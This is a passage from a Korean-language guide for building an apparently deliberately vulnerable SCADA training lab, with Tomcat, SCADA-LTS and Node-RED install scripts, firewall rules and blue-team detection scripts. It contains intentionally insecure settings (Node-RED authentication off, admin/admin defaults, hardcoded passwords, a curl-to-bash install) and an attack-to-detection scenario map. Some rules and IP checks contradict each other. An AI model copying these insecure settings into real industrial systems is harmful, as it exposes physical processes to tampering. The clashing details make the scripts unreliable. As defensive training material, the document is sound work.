ln -sf "/opt/apache-tomcat-${TOMCAT_VER}" /opt/tomcat

# Tomcat 서비스 유저 생성
useradd -r -M -U -d /opt/tomcat -s /bin/false tomcat
chown -R tomcat:tomcat /opt/tomcat /opt/apache-tomcat-${TOMCAT_VER}

# systemd 서비스 파일
cat > /etc/systemd/system/tomcat.service << 'SVCEOF'
[Unit]
Description=Apache Tomcat 9
After=network.target mysql.service

[Service]
Type=forking
User=tomcat
Group=tomcat
Environment="JAVA_HOME=/usr/lib/jvm/jre-11-openjdk"
Environment="CATALINA_PID=/opt/tomcat/temp/tomcat.pid"
Environment="CATALINA_HOME=/opt/tomcat"
Environment="CATALINA_BASE=/opt/tomcat"
Environment="CATALINA_OPTS=-Xms512M -Xmx1024M -server -XX:+UseParallelGC"
ExecStart=/opt/tomcat/bin/startup.sh
ExecStop=/opt/tomcat/bin/shutdown.sh
RestartSec=10
Restart=always

[Install]
WantedBy=multi-user.target
SVCEOF

echo "=== [6/7] SCADA-LTS 배포 ==="
# SCADA-LTS WAR 파일 다운로드 및 배포
cd /opt/tomcat/webapps
curl -LO "https://github.com/SCADA-LTS/Scada-LTS/releases/download/v2.7.7/ScadaLTS.war"

# SCADA-LTS DB 설정
mkdir -p /opt/tomcat/webapps/ScadaLTS/WEB-INF/classes
cat > /opt/scada-lts-env.properties << 'PROPEOF'
db.type=mysql
db.url=jdbc:mysql://localhost:3306/scadalts?useSSL=false&allowPublicKeyRetrieval=true&serverTimezone=Asia/Seoul
db.username=scadalts
db.password=ScadaLTS_2026!
db.driver=com.mysql.cj.jdbc.Driver
PROPEOF

systemctl daemon-reload
systemctl enable --now tomcat

echo "=== [7/7] Node-RED 설치 ==="
# Node.js 18 LTS 설치
curl -fsSL https://rpm.nodesource.com/setup_18.x | bash -
dnf install -y nodejs

# Node-RED 설치
npm install -g --unsafe-perm node-red
npm install -g --unsafe-perm node-red-dashboard

# Node-RED 서비스 유저
useradd -r -m -d /home/nodered -s /bin/bash nodered
su - nodered -c "mkdir -p /home/nodered/.node-red"

# Node-RED 대시보드 플러그인 설치
su - nodered -c "cd /home/nodered/.node-red && npm install node-red-dashboard"

# settings.js 배포 (취약한 설정 - 인증 비활성화)
cat > /home/nodered/.node-red/settings.js << 'SETTINGSEOF'
module.exports = {
    uiPort: process.env.PORT || 1880,
    uiHost: "0.0.0.0",
    functionGlobalContext: {
        SCADA_URL: "http://192.168.92.213:8080",
        PLC_API: "http://192.168.92.213:5000"
    },
    logging: {
        console: {
            level: "info",
            metrics: false,
            audit: false
        }
    },
    editorTheme: {
        projects: { enabled: false }
    }
};
SETTINGSEOF
chown -R nodered:nodered /home/nodered/.node-red

# Node-RED systemd 서비스
cat > /etc/systemd/system/node-red.service << 'NREOF'
[Unit]
Description=Node-RED
After=network.target

[Service]
Type=simple
User=nodered
Group=nodered
WorkingDirectory=/home/nodered/.node-red
ExecStart=/usr/bin/node-red --settings /home/nodered/.node-red/settings.js
Restart=on-failure
RestartSec=10
KillSignal=SIGINT
SyslogIdentifier=node-red
Environment="NODE_RED_HOME=/home/nodered/.node-red"

[Install]
WantedBy=multi-user.target
NREOF

systemctl daemon-reload
systemctl enable --now node-red

echo "=== 설치 완료 ==="
echo "SCADA-LTS: http://192.168.92.213:8080/ScadaLTS/"
echo "Node-RED:  http://192.168.92.213:1880"
echo "기본 계정: admin / admin"
```

### 7-2. 플로우 임포트 절차

```bash
# Node-RED에 플로우 JSON 임포트
curl -X POST http://192.168.92.213:1880/flows \
  -H "Content-Type: application/json" \
  -H "Node-RED-Deployment-Type: full" \
  -d @/opt/nodered-flows/plc_polling_flow.json

# 임포트 확인
curl -s http://192.168.92.213:1880/flows | python3 -m json.tool | head -20
```

### 7-3. 환경 변수

```bash
# /etc/environment (시스템 전역)
SCADA_URL=http://192.168.92.213:8080
NODERED_URL=http://192.168.92.213:1880
PLC_API=http://192.168.92.213:5000
```

---

## 8. OPNSense-5 방화벽 규칙 (SCADA 서버 관련)

| 순서 | 방향 | 출발지 | 목적지 | 프로토콜/포트 | 동작 | 설명 |
|------|------|--------|--------|---------------|------|------|
| 1 | IN | 192.168.92.212 (Ind.DMZ) | 192.168.92.213 | TCP/8080 | ALLOW | 태그 쿼리 (SCADA API) |
| 2 | IN | 192.168.92.0/24 | 192.168.92.0/24 | ANY | ALLOW | OT 내부 통신 허용 |
| 3 | OUT | 192.168.92.0/24 | 192.168.92.0/24 | ANY | BLOCK | OT→DMZ 이그레스 차단 |
| 4 | OUT | 192.168.92.0/24 | 192.168.92.0/24 | ANY | BLOCK | OT→INT 완전 차단 |
| 5 | OUT | 192.168.92.0/24 | 0.0.0.0/0 | ANY | BLOCK | OT 외부 통신 전면 차단 |
| 6 | IN | ANY | 192.168.92.0/24 | ANY | BLOCK | 기타 인바운드 전면 차단 |

**통신 흐름 (SCADA 서버 관련):**

| 출발지 | 목적지 | 포트 | 프로토콜 | 용도 |
|--------|--------|------|----------|------|
| SCADA (.10) Node-RED | PLC (.11) | TCP 5000 | HTTP GET | 센서 데이터 폴링 (5초) |
| PLC (.11) | SCADA (.10) | TCP 5000 응답 | HTTP Response | 센서 값 응답 |
| 운영자 PC 1 (.21) | SCADA (.10) | TCP 8080 | HTTP | HMI 웹 접속 |
| 운영자 PC 1 (.21) | SCADA (.10) | TCP 1880 | HTTP | Node-RED 대시보드 (선택) |
| 운영자 PC 2 (.22) | SCADA (.10) | TCP 8080 | HTTP | HMI 웹 접속 |
| 운영자 PC 2 (.22) | SCADA (.10) | TCP 1880 | HTTP | Node-RED 대시보드 (선택) |
| Ind. DMZ (.200.10) | SCADA (.10) | TCP 8080 | HTTP | 태그 쿼리 (읽기 전용) |

---

## 9. 블루팀 탐지 포인트

### 9-1. Tomcat 액세스 로그 모니터링

**로그 경로:** `/opt/tomcat/logs/localhost_access_log.*.txt`

| 탐지 항목 | 로그 패턴 | 심각도 | 설명 |
|-----------|-----------|--------|------|
| 관리자 로그인 | `POST /api/auth/login` | 높음 | admin 계정 로그인 시도 |
| 태그 값 변경 | `PUT /api/point_value/set/` | 높음 | REST API를 통한 태그 값 직접 변경 |
| 알람 설정 변경 | `PUT /api/event_detector/` | 높음 | 알람 임계값 변경 |
| 비정상 접속 IP | 192.168.92.0/24 외부에서 접근 | 높음 | OT 존 외부에서의 접근 시도 |

**탐지 규칙 (로그 기반):**

```bash
#!/bin/bash
# /opt/scripts/scada_log_monitor.sh
# SCADA-LTS Tomcat 로그 실시간 모니터링

LOG_DIR="/opt/tomcat/logs"
ALERT_LOG="/var/log/ot-security/scada_alerts.log"

tail -F "${LOG_DIR}/localhost_access_log.$(date +%Y-%m-%d).txt" | while read line; do

    # 태그 값 변경 탐지
    if echo "$line" | grep -q "PUT.*point_value/set"; then
        echo "[$(date -Iseconds)] ALERT: 태그 값 변경 시도 감지 - $line" >> "$ALERT_LOG"
    fi

    # 알람 설정 변경 탐지
    if echo "$line" | grep -q "PUT.*event_detector"; then
        echo "[$(date -Iseconds)] CRITICAL: 알람 임계값 변경 시도 - $line" >> "$ALERT_LOG"
    fi

    # admin 로그인 탐지
    if echo "$line" | grep -q "POST.*auth/login"; then
        echo "[$(date -Iseconds)] WARN: 관리자 로그인 시도 - $line" >> "$ALERT_LOG"
    fi

    # OT 존 외부 IP 탐지
    SRC_IP=$(echo "$line" | awk '{print $1}')
    if [[ ! "$SRC_IP" =~ ^192\.168\.201\. ]] && [[ "$SRC_IP" != "127.0.0.1" ]]; then
        echo "[$(date -Iseconds)] ALERT: OT 외부 접근 감지 ($SRC_IP) - $line" >> "$ALERT_LOG"
    fi

done
```

### 9-2. 태그 값 이상 탐지

SCADA-LTS의 데이터 포인트 값이 급격히 변화하거나 비정상적으로 일정한 경우 탐지한다.

```bash
#!/bin/bash
# /opt/scripts/tag_anomaly_check.sh
# 태그 값 이상 탐지 (매 30초 실행)

SCADA_URL="http://192.168.92.213:8080"
ALERT_LOG="/var/log/ot-security/tag_anomaly.log"

# 각 태그의 현재 값 조회
for tag in DP_TEMP_01 DP_PRES_01 DP_FLOW_01 DP_POWR_01; do
    VALUE=$(curl -s "${SCADA_URL}/api/point_value/${tag}" \
        -H "Authorization: Bearer $(cat /opt/scripts/.token)" \
        | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',0))")

    PREV_VALUE=$(cat "/tmp/prev_${tag}" 2>/dev/null || echo "0")
    echo "$VALUE" > "/tmp/prev_${tag}"

    # 급격한 변화 탐지 (이전 값 대비 50% 이상 변화)
    DIFF=$(python3 -c "
prev = float('${PREV_VALUE}')
curr = float('${VALUE}')
if prev != 0:
    change = abs(curr - prev) / abs(prev) * 100
else:
    change = 0
print(f'{change:.1f}')
")

    if (( $(echo "$DIFF > 50" | bc -l) )); then
        echo "[$(date -Iseconds)] ANOMALY: ${tag} 급격한 변화 (${PREV_VALUE} -> ${VALUE}, ${DIFF}%)" >> "$ALERT_LOG"
    fi

    # 값 고정 탐지 (5회 연속 동일값 -> 주입 가능성)
    echo "$VALUE" >> "/tmp/history_${tag}"
    UNIQUE_COUNT=$(tail -5 "/tmp/history_${tag}" | sort -u | wc -l)
    if [ "$UNIQUE_COUNT" -eq 1 ] && [ "$(wc -l < /tmp/history_${tag})" -ge 5 ]; then
        echo "[$(date -Iseconds)] ANOMALY: ${tag} 값 고정 의심 (${VALUE}, 5회 연속 동일)" >> "$ALERT_LOG"
    fi
done
```

### 9-3. Node-RED 플로우 변경 감사

```bash
#!/bin/bash
# /opt/scripts/nodered_flow_audit.sh
# Node-RED 플로우 무결성 검사 (매 1분 실행)

NODERED_URL="http://192.168.92.213:1880"
BASELINE_HASH_FILE="/opt/scripts/.nodered_baseline_hash"
ALERT_LOG="/var/log/ot-security/nodered_audit.log"

# 현재 플로우 해시 계산
CURRENT_HASH=$(curl -s "${NODERED_URL}/flows" | sha256sum | awk '{print $1}')

# 기준 해시와 비교
if [ -f "$BASELINE_HASH_FILE" ]; then
    BASELINE_HASH=$(cat "$BASELINE_HASH_FILE")
    if [ "$CURRENT_HASH" != "$BASELINE_HASH" ]; then
        echo "[$(date -Iseconds)] CRITICAL: Node-RED 플로우 변경 감지!" >> "$ALERT_LOG"
        echo "  기준 해시: ${BASELINE_HASH}" >> "$ALERT_LOG"
        echo "  현재 해시: ${CURRENT_HASH}" >> "$ALERT_LOG"

        # 변경된 플로우 백업
        curl -s "${NODERED_URL}/flows" > "/var/log/ot-security/nodered_flow_$(date +%Y%m%d_%H%M%S).json"
    fi
else
    # 최초 실행: 기준 해시 생성
    echo "$CURRENT_HASH" > "$BASELINE_HASH_FILE"
    echo "[$(date -Iseconds)] INFO: Node-RED 기준 해시 생성: ${CURRENT_HASH}" >> "$ALERT_LOG"
fi
```

### 9-4. Node-RED 접속 로그 분석

```bash
# Node-RED 서비스 로그에서 비정상 접근 탐지
# journalctl을 통한 실시간 모니터링

journalctl -u node-red -f | while read line; do
    # 플로우 배포 이벤트
    if echo "$line" | grep -qi "deploy"; then
        echo "[$(date -Iseconds)] WARN: Node-RED 플로우 배포 감지 - $line" \
            >> /var/log/ot-security/nodered_audit.log
    fi

    # 새 노드 설치
    if echo "$line" | grep -qi "install"; then
        echo "[$(date -Iseconds)] ALERT: Node-RED 노드 설치 감지 - $line" \
            >> /var/log/ot-security/nodered_audit.log
    fi
done
```

### 9-5. 크론탭 설정 (SCADA 서버)

```bash
# SCADA 서버 (192.168.92.213) crontab
# crontab -e

# 태그 값 이상 탐지 (30초 간격)
* * * * * /opt/scripts/tag_anomaly_check.sh
* * * * * sleep 30 && /opt/scripts/tag_anomaly_check.sh

# Node-RED 플로우 무결성 검사 (1분 간격)
* * * * * /opt/scripts/nodered_flow_audit.sh
```

### 9-6. 탐지 시나리오 매핑 (SCADA 관련)

```
[STEP 3-2] SCADA 공격
+-----------------------+     +-----------------------------------+
| 공격 행위             | --> | 탐지 포인트                       |
+-----------------------+     +-----------------------------------+
| admin/admin 로그인    | --> | Tomcat 로그: POST auth/login      |
| 태그 값 조작          | --> | Tomcat 로그: PUT point_value/set  |
|                       | --> | 태그 이상: 급격한 변화 / 값 고정  |
| 알람 임계값 변경      | --> | Tomcat 로그: PUT event_detector   |
| Node-RED 플로우 변경  | --> | 플로우 해시 불일치                |
|                       | --> | journalctl: deploy 이벤트         |
+-----------------------+     +-----------------------------------+
```

### 9-7. 블루팀 대응 체크리스트 (SCADA 관련)

| 순서 | 탐지 항목 | 확인 방법 | 대응 조치 |
|------|-----------|-----------|-----------|
| 1 | SCADA 비인가 로그인 | Tomcat 액세스 로그 | 계정 비밀번호 변경, 세션 무효화 |
| 2 | 태그 값 이상 | tag_anomaly_check.sh 알림 | SCADA 데이터 포인트 값 검증, 수동 확인 |
| 3 | 알람 임계값 변경 | event_detector API 로그 | 원래 임계값으로 복원 |
| 4 | Node-RED 플로우 변경 | 해시 불일치 알림 | 기준 플로우로 복원, Node-RED 인증 활성화 |

---

## 부록: 환경 변수 요약

```bash
# OT 존 전역 환경 변수
SCADA_URL=http://192.168.92.213:8080
NODERED_URL=http://192.168.92.213:1880
PLC_API=http://192.168.92.213:5000

# SCADA-LTS 기본 계정
SCADA_ADMIN_USER=admin
SCADA_ADMIN_PASS=admin

# 센서 태그 ID
TAG_TEMPERATURE=DP_TEMP_01
TAG_PRESSURE=DP_PRES_01
TAG_FLOW_RATE=DP_FLOW_01
TAG_POWER=DP_POWR_01
```

---

*문서 끝*
